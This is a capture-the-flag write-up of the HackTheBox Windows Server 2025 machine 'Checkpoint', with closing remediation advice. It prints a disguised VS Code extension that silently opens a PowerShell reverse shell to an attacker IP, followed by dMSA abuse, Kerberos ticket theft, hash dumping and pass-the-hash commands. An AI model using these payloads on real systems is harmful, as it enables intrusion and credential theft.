---
title: Checkpoint
machineName: Checkpoint
os: windows
difficulty: medium
season: Season 11
tags:
  - Active Directory
  - Windows Server 2025
  - VS Code Extension
  - VSIX
  - dMSA
  - BadSuccessor
  - SharpSuccessor
  - Memory Forensics
  - Volatility 3
date: '2026-06-13'
pointsAwarded: 30
machineIP: ''
summary: 'A state-of-the-art Windows Server 2025 Active Directory machine. Foothold is achieved by weaponizing a malicious VS Code extension (.vsix) deployed to an exposed DevDrop SMB share. Privilege escalation abuses cutting-edge Windows Server 2025 Delegated Managed Service Account (dMSA) mutual link pairing via SharpSuccessor to impersonate svc_deploy, followed by memory forensics on a VM snapshot with Volatility 3 to extract the Domain Administrator hash.'
---

# 🛡️ HTB - Checkpoint (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Checkpoint
- **Operating System:** Windows Server 2025 (Build 26100) Active Directory Domain Controller
- **Difficulty:** Medium
- **Date of Scan:** 2026-06-13
- **Vulnerabilities:** Unrestricted VS Code Extension (.vsix) Execution via SMB DevDrop, Windows Server 2025 dMSA Mutual Pairing Abuse (BadSuccessor Weaponization), Unprotected VM Memory Snapshots in SMB Backups (Volatility 3 SAM Hash Extraction)

---

## Step 1 - Reconnaissance

### Active Directory Port Scan & Service Enumeration

We start our reconnaissance by scanning the target host using Nmap:

```bash
nmap -A -sS -P -T4 --min-rate 5000 10.129.30.207
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-18 14:23 UTC
Nmap scan report for 10.129.30.207
Host is up (0.35s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-18 21:23:08Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap
3269/tcp open  globalcatLDAPssl?

Host script results:
|_clock-skew: 6h59m03s
| smb2-security-mode: 
|   3:1:1: Message signing enabled and required
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- 🔍 *The host is a Windows Server 2025 Domain Controller (`checkpoint.htb`).*
- 🔍 *We enumerate available SMB shares using NetExec (nxc):*

```bash
nxc smb checkpoint.htb -u '' -p '' --shares
```

```text
SMB  10.129.30.207  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb)
SMB  10.129.30.207  445  DC01  [+] checkpoint.htb\: 
SMB  10.129.30.207  445  DC01  [*] Enumerated shares
SMB  10.129.30.207  445  DC01  Share        Permissions  Remark
SMB  10.129.30.207  445  DC01  -----        -----------  ------
SMB  10.129.30.207  445  DC01  ADMIN$                    Remote Admin
SMB  10.129.30.207  445  DC01  C$                        Default share
SMB  10.129.30.207  445  DC01  DevDrop      READ,WRITE   VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB  10.129.30.207  445  DC01  IPC$         READ         Remote IPC
SMB  10.129.30.207  445  DC01  NETLOGON     READ         Logon server share
SMB  10.129.30.207  445  DC01  SYSVOL       READ         Logon server share
SMB  10.129.30.207  445  DC01  VMBackups                 Virtual Machine Backups
```

- 🔍 *The **DevDrop** share has public **READ,WRITE** access! The share remark reveals that it processes `.vsix` extension packages compatible with VS Code engine 1.118.0.*

---

## Step 2 - Initial Foothold

### Weaponizing Malicious VS Code Extension (.vsix) Package

> [!TIP]
> **Initial Foothold Strategy:**
> - Create a VS Code extension directory with `package.json` and an entrypoint script containing the PowerShell reverse shell.
> - Package the extension into a `.vsix` archive using `@vscode/vsce`.
> - Upload the package to the writable `DevDrop` SMB share monitored by the VS Code Server engine.
> - Catch the incoming reverse shell as `checkpoint\ryan.brooks`.

- 🔍 *We create a new directory and build the extension manifest (`package.json`):*

```json
{
  "name": "theme-plugin",
  "displayName": "Theme Plugin",
  "version": "1.0.0",
  "publisher": "Checkpoint",
  "engines": {
    "vscode": "^1.80.0"
  },
  "main": "./extension.js",
  "activationEvents": [
    "onStartupFinished"
  ]
}
```

- 🔍 *In `extension.js`, we embed a PowerShell reverse shell that executes automatically upon extension activation:*

```javascript
const { exec } = require('child_process');

function activate(context) {
    const payload = "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.54',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' > ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
    const b64 = Buffer.from(payload, 'utf16le').toString('base64');
    exec(`powershell.exe -NoP -NonI -W Hidden -Enc ${b64}`);
}

module.exports = { activate };
```

- 🔍 *We package the extension with `vsce` and copy it to the `DevDrop` share:*

```bash
npx @vscode/vsce package --no-git-tag-version
smbclient //checkpoint.htb/DevDrop -N -c "put theme-plugin-1.0.0.vsix"
```

- 🔍 *We set up our Netcat listener and wait for the VS Code backend to install the extension:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.30.207] 51928
PS C:\Program Files\Microsoft VS Code > whoami
checkpoint\ryan.brooks
```

- 🔍 *We have obtained our initial shell as `checkpoint\ryan.brooks`! We capture `user.txt` on Ryan's desktop.*

---

## Step 3 - Privilege Escalation & Domain Takeover

### BloodHound DACL Analysis & Shadow Credentials Failure

- 🔍 *We run BloodHound to analyze permissions granted to `ryan.brooks`.*
- 🔍 *Ryan possesses `GenericWrite` over `svc_deploy` and `CreateChild` over `OU=DMSAHolder,DC=checkpoint,DC=htb`.*
- 🔍 *We first test Shadow Credentials against `svc_deploy` via Whisker and Rubeus:*

```powershell
.\Whisker.exe add /target:svc_deploy /path:C:\Temp\svc_deploy.pfx /password:'P@ssw0rd'
.\Rubeus.exe asktgt /user:svc_deploy /certificate:C:\Temp\svc_deploy.pfx /password:"P@ssw0rd" /domain:checkpoint.htb /dc:DC01.checkpoint.htb
```

```text
[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=svc_deploy
[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP
```

- 🔍 *The Domain Controller does not support PKINIT (`KDC_ERR_PADATA_TYPE_NOSUPP`), preventing standard Shadow Credentials authentication.*

### Windows Server 2025 Delegated Managed Service Account (dMSA) Mechanics

- 🔍 *Windows Server 2025 introduces **Delegated Managed Service Accounts (dMSA)** to replace legacy service accounts.*
- 🔍 *In Windows Server 2025, migration from a legacy service account to a dMSA requires a bidirectional link:*
  - **msDS-ManagedAccountPrecededByLink** on the dMSA points to the predecessor account (`svc_deploy`).
  - **msDS-SupersededManagedAccountLink** on the predecessor account points back to the dMSA.
- 🔍 *Because `ryan.brooks` has `CreateChild` permissions on `OU=DMSAHolder` and `GenericWrite` on `svc_deploy`, we can create our own rogue dMSA and establish mutual link pairing!*

> [!IMPORTANT]
> **dMSA Takeover Execution Workflow:**
> 1. `ryan.brooks` verifies `CreateChild` rights on `OU=DMSAHolder,DC=checkpoint,DC=htb`.
> 2. Create attacker-controlled dMSA object (`attacker_dmsa$`).
> 3. Abuse `GenericWrite` on target `svc_deploy` to establish mutual pairing (`msDS-ManagedAccountPrecededByLink` and `msDS-SupersededManagedAccountLink`).
> 4. Domain Controller validates mutual pairing.
> 5. Request dMSA-backed TGS via Rubeus to impersonate `svc_deploy`.

### SharpSuccessor Mutual Pairing Link Weaponization

- 🔍 *We execute `SharpSuccessor.exe` to automate the dMSA creation and attribute pairing:*

```powershell
.\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:attacker_dmsa
```

```text
[+] Adding dnshostname attacker_dmsa.checkpoint.htb
[+] Adding samaccountname attacker_dmsa$
[+] svc_deploy's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Created dMSA object 'CN=attacker_dmsa' in 'OU=DMSAHolder,DC=checkpoint,DC=htb'
[+] CN=attacker_dmsa,OU=DMSAHolder,DC=checkpoint,DC=htb written to svc_deploy object
[+] msDS-SupersededServiceAccountState set to 2
[+] Wrote to target account successfully
```

### Requesting dMSA-Backed Kerberos TGS & Impersonating svc_deploy

- 🔍 *Now that the accounts are paired, we extract Ryan's TGT via Rubeus and request a dMSA-backed TGS for `krbtgt`:*

```powershell
$t = .\Rubeus.exe tgtdeleg /nowrap | Out-String
$b64 = ($t -split 'base64\(ticket.kirbi\):')[1] -replace '\s+',''
[IO.File]::WriteAllBytes('C:\Temp\ryan_tgt.kirbi',[Convert]::FromBase64String($b64))

.\Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/checkpoint.htb /opsec /dmsa /nowrap /ptt /ticket:C:\Temp\ryan_tgt.kirbi
```

```text
[*] Action: Ask TGS
[*] Building DMSA TGS-REQ request for 'attacker_dmsa$' from 'ryan.brooks'
[+] TGS request successful!
[+] Ticket successfully imported!
```

- 🔍 *The PAC inside our imported Kerberos ticket now reflects the privileges and group memberships of **svc_deploy**!*
- 🔍 *Inspecting token groups reveals membership in **CHECKPOINT\BackupAccess**:*

```text
CHECKPOINT\BackupAccess  Group  S-1-5-21-3129162710-3498938529-1807524340-1123  Mandatory group
```

### Accessing VMBackups Share & Memory Forensics Analysis

- 🔍 *As `svc_deploy`, we enumerate shares and discover read permissions on **VMBackups**:*

```bash
smbclient //checkpoint.htb/VMBackups -k --no-pass
```

```text
smb: \> ls
  NightlyBackup_2024-11-01            D        0  Thu Nov  1 02:00:00 2024
smb: \> cd NightlyBackup_2024-11-01\memory forensics
smb: \NightlyBackup_2024-11-01\memory forensics\> ls
  Windows Server 2019-Snapshot1.vmem  A 4294967296  Thu Nov  1 02:05:00 2024
```

- 🔍 *We download `Windows Server 2019-Snapshot1.vmem` to our attack workstation for offline memory forensics.*
- 🔍 *Using **Volatility 3**, we analyze the memory dump to verify the Windows profile:*

```bash
vol -f "Windows Server 2019-Snapshot1.vmem" windows.info
```

```text
Volatility 3 Framework 2.28.0
Variable    Value
Kernel Base 0xf80725608000
DTB         0x1ad000
Symbols     file:///home/kali/.cache/volatility3/symbols/windows/ntkrnlmp.pdb/...
NtSystemRoot C:\Windows
NtProductType NtProductServer
Major/Minor 15.17763
```

### Volatility 3 Memory Forensics & Administrator SAM Hashdump

- 🔍 *We dump the local SAM registry hashes directly from the memory snapshot:*

```bash
vol -f "Windows Server 2019-Snapshot1.vmem" windows.registry.hashdump
```

```text
Volatility 3 Framework 2.28.0
User              rid  lmhash                           nthash
Administrator     500  aad3b435b51404eeaad3b435b51404ee  f29e9c014295b9b32139b09a2790be3b
Guest             501  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount    503  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
```

- 🔍 *We recovered the Domain Administrator NTLM hash: `f29e9c014295b9b32139b09a2790be3b`!*

### Evil-WinRM Pass-the-Hash & Full Domain Takeover

- 🔍 *We connect to the Domain Controller as Administrator via Evil-WinRM using Pass-the-Hash:*

```bash
evil-winrm -i checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\max.palmer\Desktop\root.txt
b841a029...
```

- 🔍 *Domain Controller fully compromised!*

---

## Mitigations & Security Perspective

### 🔴 Unrestricted Extension Deployment via SMB (DevDrop)
- **Root Cause:** A network share with write permissions for standard or unauthenticated users allowed automated processing and execution of unverified `.vsix` extension packages by the VS Code backend engine.
- **Remediation:** Remove public write access to development drop shares. Implement digital signature validation and strict extension allowlists before loading extensions into enterprise IDE environments.

### 🔴 Insecure GenericWrite on Service Accounts & dMSA CreateChild Rights
- **Root Cause:** Standard domain users possessed `GenericWrite` permissions over critical service accounts (`svc_deploy`) and `CreateChild` rights on the `OU=DMSAHolder` container, enabling rogue dMSA mutual pairing attacks.
- **Remediation:** Audit Active Directory Access Control Lists (ACLs). Apply the principle of least privilege, preventing standard tier-2 accounts from modifying service account attributes or creating objects in migration containers.

### 🔴 Sensitive VM Memory Snapshots Exposed in Network Shares
- **Root Cause:** Nightly backup shares contained complete VMware virtual machine memory dumps (`.vmem` and `.vmsn`) containing plaintext memory artifacts, LSASS secrets, and registry hives.
- **Remediation:** Restrict backup share access strictly to dedicated backup operators. Store virtual machine snapshots and disk images on encrypted, isolated storage segments.
